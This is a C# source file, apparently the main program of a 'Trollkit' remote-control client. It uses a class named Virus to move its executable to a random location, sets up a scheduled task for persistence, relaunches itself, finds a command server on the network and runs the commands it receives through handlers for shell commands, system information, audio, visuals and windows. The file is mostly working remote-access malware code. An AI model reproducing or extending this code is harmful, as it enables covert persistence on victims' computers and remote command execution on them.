﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using Trollkit_Client.Modules;
using Trollkit_Client.Modules.CommandHandlers;
using Trollkit_Library;
using Trollkit_Library.ClientModules;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client
{
	class Program
	{
		private ClientDiscovery discover;
		private ClientReceiver receiver;
		public Dictionary<string,ICommandHandler> handlers;

		static void Main(string[] args)
		{
			if (args.Length > 0)
				if(args[0] == "move-completed")
				{
					BConsole.WriteLine("Application has been moved to a different location...", ConsoleColor.Yellow);			
					bool attemptReconnect = true;
					Task.Run(() => {
						while (attemptReconnect)
						{
							var program = new Program();
							var addresses = program.discover.GetIpAddresses();
							string ip = program.discover.GetRemoteServerIp(addresses);
							attemptReconnect = program.receiver.ConnectAndReceive(ip);
						}
						BConsole.WriteLine("Connection closed. Program halted.", ConsoleColor.Red);
						Thread.Sleep(4000);
						Environment.Exit(0);
						return;
					});

					while(true)
						Console.ReadLine();
				}

			Virus virus = new Virus();
			string randomLocation = virus.FindRandomFileLocation();
			string newExecutablePath = virus.MoveFileToLocation(randomLocation);
			BConsole.WriteLine($"New File location: {newExecutablePath}");
			new TaskSchedulerHelper().CreateTask(newExecutablePath);

			Process.Start(newExecutablePath, "move-completed");
		}

		public Program()
		{
			discover = new ClientDiscovery("gang?", "Dopple gang");
			receiver = new ClientReceiver();
			receiver.OnDataReceived += Receiver_OnDataReceived;
			handlers = new Dictionary<string,ICommandHandler>();
			handlers.Add("Task", new TaskHandler());
			handlers.Add("Audio", new AudioHandler());
			handlers.Add("Visuals", new VisualsHandler());
			handlers.Add("Windows", new WindowsHandler());
			handlers.Add("SystemInfo", new SystemInfoHandler());
			handlers.Add("CMD", new CMDHandler());
		}

		private void Receiver_OnDataReceived(Socket s, TransferCommandObject Object)
		{
			try
			{
				if (handlers.ContainsKey(Object.Handler))
				{
					if (handlers[Object.Handler].HandleCommand(s, Object))
					{
						BConsole.WriteLine($"Command '{Object.Command}' executed successfully.", ConsoleColor.Green);
					}
					else
					{
						BConsole.WriteLine($"Command '{Object.Command}' could not be executed.", ConsoleColor.Red);
					}
				}
				else
				{
					BConsole.WriteLine($"Unkown Handler '{Object.Handler}', please refer to the README.md", ConsoleColor.Red);
				}
			}
			catch(Exception e)
			{
				BConsole.WriteLine("Handler error: " + e.Message, ConsoleColor.Red);
			}
		}
	}
}
